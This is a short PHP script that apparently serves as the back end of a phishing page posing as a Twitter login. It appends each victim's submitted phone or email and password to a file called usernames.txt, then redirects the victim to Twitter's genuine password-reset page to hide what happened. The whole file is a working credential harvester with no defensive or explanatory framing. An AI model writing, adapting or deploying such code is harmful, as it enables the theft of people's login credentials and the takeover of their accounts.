<?php

file_put_contents("usernames.txt", "Twitter Username: " . $_POST['phone_or_email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
?>
